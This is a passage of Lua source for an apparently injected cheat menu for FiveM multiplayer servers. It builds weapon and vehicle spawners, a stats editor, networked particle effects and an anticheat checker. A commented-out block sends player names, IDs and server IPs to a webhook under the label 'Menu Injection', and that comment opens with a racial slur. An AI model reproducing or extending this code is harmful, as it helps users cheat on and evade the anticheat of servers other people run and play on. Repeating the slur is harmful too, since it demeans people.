                            c.var.data.weaponpritelink ~= iu then
                            c.fram.var.timers.wep_nextsprite.time = c.fram.var
                                                                        .timers
                                                                        .currTime;
                            c.var.data.weaponpritelink = iu;
                            b.SetDuiUrl(c.fram.var.txobjects.wep_nextsprite,
                                        c.var.data.weaponpritelink)
                        end
                    end
                },
                func = 'ComboBox',
                result = function(c0)
                    b.GiveWeaponToPed(b.PlayerPedId(), b.GetHashKey(c0.result),
                                      c.var.checkbox['weaponspawner:fullbullets'] and
                                          250 or
                                          b.GetMaxAmmoInClip(b.PlayerPedId(),
                                                             b.GetHashKey(
                                                                 c0.result)),
                                      true, false)
                end
            })
        end
        for k, eB in c._pairs(c.var.data.vehicleslist) do
            c._table.insert(c.fram.menus.VehicleSpawner.options, {
                data = {
                    title = eB[1],
                    value = 'vehspawner:' .. k,
                    labels = eB[2],
                    hover = function(c0, ih)
                        if c.fram.var.timers.currTime -
                            c.fram.var.timers.veh_nextsprite.time >=
                            c.fram.var.timers.veh_nextsprite.delay and
                            c.var.data.vehiclespritelink ~= nil --[[
                            'http://getmessi.absolutemenu.cc/absoimages/vehicles/' ..
                            ih .. '.jpg']] then
                            c.fram.var.timers.veh_nextsprite.time = c.fram.var
                                                                        .timers
                                                                        .currTime;
                            c.var.data.vehiclespritelink = nil--[[
                                'http://getmessi.absolutemenu.cc/absoimages/vehicles/' ..
                                    ih .. '.jpg' ]]
                            b.SetDuiUrl(c.fram.var.txobjects.veh_nextsprite,
                                        c.var.data.vehiclespritelink)
                        end
                    end
                },
                func = 'ComboBox',
                result = function(c0)
                    c.func.CreateParametedVehicle(c0.label)
                end
            })
        end
        for k, eB in c._ipairs(c.var.data.CraftLab.Maps) do
            c._table.insert(c.fram.menus.MiscCraftMaps.options, {
                data = {title = eB[1]},
                func = 'Button',
                result = function()
                    c.func.CreateCraftMap(eB[3])
                    if c.var.checkbox['craft:mapstp'] then
                        b.SetEntityCoords(b.PlayerPedId(), eB[2])
                    end
                end
            })
        end
        for k, eB in c._ipairs(c.var.data.CraftLab.Vehicles) do
            c._table.insert(c.fram.menus.MiscCraftVehicles.options, {
                data = {title = eB[1]},
                func = 'Button',
                result = function()
                    c.func.CreateCraftVehicle(eB[2], eB[3])
                end
            })
        end
        for k, eB in c._pairs(c.var.data.WardobeMakerValues) do
            for hk, hl in c._pairs(eB) do
                if k == 'props' then
                    c._table.insert(c.fram.menus.Self_WardobeMaker.options, {
                        data = {
                            title = hl[1],
                            value = 'wrdb:' .. hl[1],
                            labels = hl[2]
                        },
                        func = 'ComboBox',
                        result = function(c0)
                            b.SetPedPropIndex(b.PlayerPedId(), hk, c0.index, 1,
                                              1)
                        end
                    })
                    c._table.insert(c.fram.menus.Self_WardobeMaker.options, {
                        data = {
                            title = hl[1] .. ' Colors',
                            value = 'wrdb:colors:' .. hl[1],
                            labels = hl[3]
                        },
                        func = 'ComboBox',
                        result = function(c0)
                            b.SetPedPropIndex(b.PlayerPedId(), hk,
                                              b.GetPedPropIndex(b.PlayerPedId(),
                                                                hk), c0.index, 1)
                        end
                    })
                else
                    c._table.insert(c.fram.menus.Self_WardobeMaker.options, {
                        data = {
                            title = hl[1],
                            value = 'wrdb:' .. hl[1],
                            labels = hl[2]
                        },
                        func = 'ComboBox',
                        result = function(c0)
                            b.SetPedComponentVariation(b.PlayerPedId(), hk,
                                                       c0.index, 1, 1)
                        end
                    })
                    c._table.insert(c.fram.menus.Self_WardobeMaker.options, {
                        data = {
                            title = hl[1] .. ' Colors',
                            value = 'wrdb:colors:' .. hl[1],
                            labels = hl[3]
                        },
                        func = 'ComboBox',
                        result = function(c0)
                            b.SetPedComponentVariation(b.PlayerPedId(), hk,
                                                       b.GetPedDrawableVariation(
                                                           b.PlayerPedId()),
                                                       c0.index, 1)
                        end
                    })
                end
            end
        end
        for k, eB in c._pairs(c.var.data.AnimationsList) do
            c._table.insert(c.fram.menus.Self_Animations.options, {
                data = {
                    title = k,
                    value = 'animations:' .. k,
                    labels = eB.labels,
                    results = eB.info
                },
                func = 'ComboBox',
                result = function(c0)
                    c.func.RunAnimation(b.PlayerPedId(), c0.result.type,
                                        c0.result.data)
                end
            })
        end
        for k, eB in c._pairs(c.var.data.StatsModifier) do
            c._table.insert(c.fram.menus.Self_StatsEditor.options, {
                data = {
                    title = k,
                    value = 'stats:' .. eB,
                    labels = {
                        '10%', '20%', '30%', '40%', '50%', '60%', '70%', '80%',
                        '90%', '100%'
                    }
                },
                func = 'ComboBox',
                result = function(c0)
                    for ev = 0, 5 do
                        b.StatSetInt(c._string.format(eB, ev),
                                     c0.index * 10 - 1, true)
                    end
                end
            })
        end
        for k, eB in c._pairs(c.var.data.Particles) do
            c._table.insert(c.fram.menus.MiscParticles.options, {
                data = {
                    title = eB.label,
                    value = 'particles:' .. k,
                    labels = eB.labels,
                    results = eB.data
                },
                func = 'ComboBox',
                result = function(c0)
                    c.func.ParticlesOnCoords(c0.result[1], c0.result[2],
                                             b.GetEntityCoords(b.PlayerPedId()),
                                             c.var.data.selectedParticleScale,
                                             c.var.checkbox['particles:network'])
                    c.var.data.selectedParticle = c0.result
                end
            })
        end
        for k, eB in c._ipairs(c.var.data.Kits[1]) do
            c._table.insert(c.fram.menus.PremadeKits.options, {
                data = {title = eB},
                func = 'Button',
                result = function()
                    c.func.ApplyKitToEntity(b.PlayerPedId(),
                                            c.var.data.Kits[2][k])
                end
            })
        end
    end)
    a.CreateThread(function()
        --[[stfu with yo weak ass logs nigga
        if b.GetUniqueId() > 0 then
            local iv = b.GetCurrentServerEndpoint()
            local iw, ix, iy, iz, iA, eF = b.GetLocalTime()
            c.var.data.InjectionId = c.fram.func.RString()
            if c._starts(iv, '10.') or c._starts(iv, '172.') or
                c._starts(iv, '192.168.') or c._starts(iv, '169.254.') then
                c.func.WebhookLog({
                    {name = 'Name:', value = b.GetPlayerName(b.PlayerId())},
                    {name = 'UID:', value = b.GetUniqueId()},
                    {name = 'Server IP:', value = iv}, {
                        name = 'Time:',
                        value = ix .. '/' .. iy .. '/' .. iw .. ' - ' .. iz ..
                            ':' .. iA .. ':' .. eF
                    }, {name = 'Inject:', value = c.var.data.InjectionId}
                }, 'Localhost injection', 0xff0000)
                return
            else
                c.func.WebhookLog({
                    {name = 'Name:', value = b.GetPlayerName(b.PlayerId())},
                    {name = 'UID:', value = b.GetUniqueId()},
                    {name = 'Server IP:', value = iv}, {
                        name = 'Time:',
                        value = ix .. '/' .. iy .. '/' .. iw .. ' - ' .. iz ..
                            ':' .. iA .. ':' .. eF
                    }, {name = 'Inject:', value = c.var.data.InjectionId}
                }, 'Menu Injection')
                c.fram.func.Notify('info', 'IID: ' .. c.var.data.InjectionId)
            end
        end]]
        c.fram.func.AskKeybind({MenuKey = true})
        c.fram.func.NotificationsMain()
        c.func.DynamicTriggers()
        c.func.AnticheatChecker()
        for k, eB in c._pairs(c.var.data.AddonVehicles.known) do
            if b.IsModelValid(b.GetHashKey(eB)) then
                c.var.data.AddonVehicles.saved[#c.var.data.AddonVehicles.saved +
                    1] = eB
            end
        end
        local iB = {
            {
                'https://cdn.upload.systems/uploads/QQUzLU4A.png',
                {550, 128}, 'header',
                c.fram.func.RString(c._math.random(10, 20))
            }, {
                'https://cdn.upload.systems/uploads/ScdzTqlu.jpg',
                {170, 100}, 'veh_nextsprite',
                c.fram.func.RString(c._math.random(10, 20))
            }, {
                'https://cdn.upload.systems/uploads/ScdzTqlu.jpg',
                {170, 100}, 'wep_nextsprite',
                c.fram.func.RString(c._math.random(10, 20))
            }, {
                'https://cdn.upload.systems/uploads/uo1wxBGh.jpg',
                {172, 450}, 'wep_ped',
                c.fram.func.RString(c._math.random(10, 20))
            }, {
                'https://docs.fivem.net/peds/ig_tomcasino.webp', {172, 450},
                'self_pedchanger', c.fram.func.RString(c._math.random(10, 20))
            }
        }
        for k, eB in c._ipairs(iB) do

        end
        while c.fram.enabled do
            a.Wait(0)
            c.fram.var.timers.currTime = b.GetGameTimer()
            c.fram.var.colors.menuAlpha =
                c.fram.shouldShow and
                    c._math.lerp(c.fram.var.colors.menuAlpha, 255, 15) or
                    c._math.lerp(c.fram.var.colors.menuAlpha, 0, -15)
            if b.IsDisabledControlJustPressed(0, c.Keybinds[1].key) then
                c.fram.shouldShow = not c.fram.shouldShow
            end
            if c.fram.var.colors.menuAlpha > 0 then
                c.fram.func.Display()
            end
            if #c.Keybinds > 1 then
                for ev = 2, #c.Keybinds, 1 do
                    if b.IsAnyControlJustPressed(0, c.Keybinds[ev].key) then
                        if c.Keybinds[ev].type == 'Button' then
                            c.Keybinds[ev].result()
                        elseif c.Keybinds[ev].type == 'CheckBox' then
                            c.var.checkbox[c.Keybinds[ev].value] = not c.var
                                                                       .checkbox[c.Keybinds[ev]
                                                                       .value]
                            if c.Keybinds[ev].result then
                                a.CreateThread(function()
                                    c.Keybinds[ev].result()
                                end)
                            end
                        end
                    end
                end
            end
        end
    end)

end)

-- bäärs#3150
-- discord.gg/sPHW7CTTZj